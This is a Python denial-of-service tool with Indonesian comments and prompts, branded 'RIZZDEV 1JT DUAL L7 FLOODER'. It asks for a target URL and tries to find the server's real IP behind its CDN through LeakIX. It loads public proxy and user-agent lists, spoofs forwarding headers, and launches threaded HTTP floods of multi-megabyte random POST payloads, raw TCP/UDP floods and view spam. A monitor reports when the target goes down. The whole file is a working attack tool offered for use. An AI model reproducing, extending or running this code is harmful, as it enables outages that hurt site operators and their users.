import cloudscraper, socket, threading, random, time, os, string, requests, re
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
from threading import Lock, Thread

# === LOAD USER AGENT LIST ===
user_agents = []

def load_user_agents():
    global user_agents
    try:
        print("📦 Mengambil user-agent list dari GitHub...")
        res = requests.get("https://raw.githubusercontent.com/Rizz9/10k-user-agent/main/user_agents.txt", timeout=10)
        user_agents = list(set(res.text.strip().splitlines()))
        print(f"✅ Total User-Agent dimuat: {len(user_agents)}")
    except Exception as e:
        print(f"❌ Gagal ambil user-agent: {e}")
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6)",
            "Mozilla/5.0 (Linux; Android 12)",
            "Googlebot/2.1 (+http://www.google.com/bot.html)"
        ]

# === FUNGSI: Coba cari Real IP lewat LeakIX ===
def resolve_real_ip(domain):
    print(f"🔍 Mencari real IP untuk: {domain} ...")
    try:
        res = requests.get(f"https://leakix.net/domain/{domain}", timeout=5)
        ip_list = re.findall(r'/host/([\d\.]+)"', res.text)
        unique_ips = list(set(ip_list))
        if unique_ips:
            print(f"💥 Real IP ditemukan: {unique_ips[0]}")
            return unique_ips[0]
        else:
            print("❌ Tidak ada real IP ditemukan.")
            return None
    except Exception as e:
        print(f"❌ Error saat mencari real IP: {e}")
        return None

# === INPUT ===
TARGET_URL = input("🔗 URL Target (https://example.com): ").strip().rstrip("/")
MAX_THREADS = int(input("🧵 Jumlah Threads (Total untuk L4 + L7 + VIEW): "))
PAYLOAD_MB = int(input("📦 Payload per Request (MB): "))
DELAY = float(input("⏱ Delay antar Batch L7 (detik): "))
USE_PROXY = input("🌐 Gunakan proxy dari GitHub list? (y/n): ").strip().lower() == 'y'
ENABLE_VIEW = input("👁️ Aktifkan Spam View? (y/n): ").strip().lower() == 'y'

# === PARSE DOMAIN ===
parsed = urlparse(TARGET_URL)
TARGET_DOMAIN = parsed.hostname

# === CARI REAL IP (JIKA ADA) ===
REAL_IP = resolve_real_ip(TARGET_DOMAIN)
if REAL_IP:
    TARGET_IP = REAL_IP
else:
    TARGET_IP = socket.gethostbyname(TARGET_DOMAIN)

TARGET_PORT = 80 if parsed.scheme == "http" else 443
print(f"✅ IP Target: {TARGET_IP}:{TARGET_PORT}")

# === PROTOCOL DETECTION ===
def check_tcp(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip, port))
        s.close()
        return True
    except:
        return False

def check_udp(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.sendto(b"ping", (ip, port))
        s.close()
        return True
    except:
        return False

tcp_ok = check_tcp(TARGET_IP, TARGET_PORT)
udp_ok = check_udp(TARGET_IP, TARGET_PORT)
PROTOCOL = "tcp" if tcp_ok else "udp" if udp_ok else "tcp"
print(f"🧠 Auto Protocol L4 terdeteksi: {PROTOCOL.upper()}")

# === PROXY ===
proxies = []
proxy_sources = [
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt"
]

if USE_PROXY:
    print("🌐 Mengambil proxy dari beberapa sumber GitHub...")
    for source in proxy_sources:
        try:
            res = requests.get(source, timeout=10)
            lines = res.text.strip().split('\n')
            print(f"  ✅ {len(lines)} proxy dari {source}")
            proxies.extend(lines)
        except Exception as e:
            print(f"  ❌ Gagal ambil dari {source}: {e}")
    proxies = list(set([p.strip() for p in proxies if ":" in p]))
    print(f"\n🎯 Total proxy aktif dimuat: {len(proxies)}")

# === MONITORING ===
sukses = gagal = total_data = l4_sent = view_sent = total_req = 0
target_status = "🟢 OKE"
lock = Lock()

def kotak(text):
    lines = text.strip().split("\n")
    panjang = max(len(line) for line in lines)
    bar = "═" * (panjang + 4)
    box = [f"╔{bar}╗"]
    for line in lines:
        box.append(f"║  {line.ljust(panjang)}  ║")
    box.append(f"╚{bar}╝")
    return "\n".join(box)

def gen_data():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=PAYLOAD_MB * 1024 * 1024))

def random_headers():
    ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
    ua = random.choice(user_agents) if user_agents else "Mozilla/5.0"
    return {
        "User-Agent": ua,
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "Referer": f"https://www.google.com/search?q={random.randint(1000,9999)}",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Connection": "keep-alive",
        "Cookie": f"PHPSESSID={''.join(random.choices('abcdef0123456789', k=32))}"
    }

def attack_l7_dual():
    global sukses, gagal, total_data, total_req
    try:
        scraper = cloudscraper.create_scraper(delay=0, browser={"custom": "Chrome"})
        proxy = random.choice(proxies) if USE_PROXY and proxies else None
        if proxy:
            scraper.proxies.update({"http": f"http://{proxy}", "https": f"http://{proxy}"})
        
        for _ in range(1_000_000):
            method = random.choice(["POST", "GET", "HEAD"])
            path = random.choice(["", "api", "upload", "search", "view"])
            query = f"?r={random.randint(1111,9999)}"

            url_domain = f"{TARGET_URL}/{path}{query}"
            url_ip = f"http://{REAL_IP}/{path}{query}"

            for url, headers in [(url_domain, random_headers()), (url_ip, random_headers())]:
                if url == url_ip:
                    headers["Host"] = TARGET_DOMAIN

                try:
                    if method == "POST":
                        data = gen_data()
                        if random.choice(["form", "multipart"]) == "form":
                            headers["Content-Type"] = "application/x-www-form-urlencoded"
                            scraper.post(url, headers=headers, data={"data": data}, timeout=5)
                        else:
                            scraper.post(url, headers=headers, files={"file": ("data.txt", data)}, timeout=5)
                        sent = len(data)
                    else:
                        scraper.request(method, url, headers=headers, timeout=5)
                        sent = 0

                    with lock:
                        sukses += 1
                        total_data += sent
                        total_req += 1

                except:
                    with lock:
                        gagal += 1
                        total_req += 1

            time.sleep(DELAY)

    except:
        with lock:
            gagal += 1
            total_req += 1

def attack_l4():
    global l4_sent, total_req
    try:
        for _ in range(1_000_000):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if PROTOCOL == "udp" else socket.SOCK_STREAM)
            sock.settimeout(3)
            payload = gen_data().encode()

            try:
                if PROTOCOL == "tcp":
                    sock.connect((TARGET_IP, TARGET_PORT))
                    sock.sendall(payload)
                else:
                    sock.sendto(payload, (TARGET_IP, TARGET_PORT))
            except:
                pass

            with lock:
                l4_sent += len(payload)
                total_req += 1

            sock.close()
    except:
        with lock:
            total_req += 1

def spam_view():
    global view_sent, total_req
    try:
        scraper = cloudscraper.create_scraper()
        proxy = random.choice(proxies) if USE_PROXY and proxies else None
        if proxy:
            scraper.proxies.update({"http": f"http://{proxy}", "https": f"http://{proxy}"})
        headers = random_headers()

        for _ in range(1_000_000):
            try:
                url = f"{TARGET_URL}?view={random.randint(100000,999999)}"
                scraper.get(url, headers=headers, timeout=5)
                with lock:
                    view_sent += 1
                    total_req += 1
            except:
                with lock:
                    total_req += 1
    except:
        with lock:
            total_req += 1

def cek_target_status():
    global target_status
    try:
        r = requests.get(TARGET_URL, timeout=3)
        target_status = "🔴 DOWN" if r.status_code >= 500 else "🟢 OKE"
    except:
        target_status = "🔴 DOWN"

def monitor():
    prev_sukses = prev_gagal = prev_data = prev_l4 = prev_view = 0
    while True:
        time.sleep(5)
        cek_target_status()
        with lock:
            ds, dg = sukses - prev_sukses, gagal - prev_gagal
            dd, dl4 = total_data - prev_data, l4_sent - prev_l4
            dv = view_sent - prev_view
            prev_sukses, prev_gagal, prev_data, prev_l4, prev_view = sukses, gagal, total_data, l4_sent, view_sent
        r_l7 = dd / 1024 / 1024 / 5
        r_l4 = dl4 / 1024 / 1024 / 5
        info = (
            f"📊 L7:\n"
            f"   ✅ Sukses: {sukses}\n"
            f"   ❌ Gagal: {gagal}\n"
            f"   📦 Data: {round(total_data/1024/1024, 2)} MB\n"
            f"   ⚡ Speed: {round(r_l7, 2)} MB/s\n\n"
            f"📡 L4:\n"
            f"   📦 Total: {round(l4_sent/1024/1024, 2)} MB\n"
            f"   ⚡ Speed: {round(r_l4, 2)} MB/s\n\n"
            f"👁️ VIEW:\n"
            f"   👁️ Total View: {view_sent}\n"
            f"   🚀 Speed: {dv}/5s\n\n"
            f"📈 Total Request: {total_req} (1JT x thread)\n\n"
            f"📡 STATUS: URL : {target_status}"
        )
        print(kotak(info))

def main():
    os.system("cls" if os.name == "nt" else "clear")
    load_user_agents()
    print(kotak("🔥 RIZZDEV 1JT DUAL L7 FLOODER 🔥"))
    Thread(target=monitor, daemon=True).start()
    try:
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
            for i in range(MAX_THREADS):
                if ENABLE_VIEW and i % 3 == 0:
                    ex.submit(spam_view)
                elif i % 3 == 1:
                    ex.submit(attack_l4)
                else:
                    ex.submit(attack_l7_dual)
    except KeyboardInterrupt:
        print("\n⛔ Dihentikan oleh user.")

if __name__ == "__main__":
    main()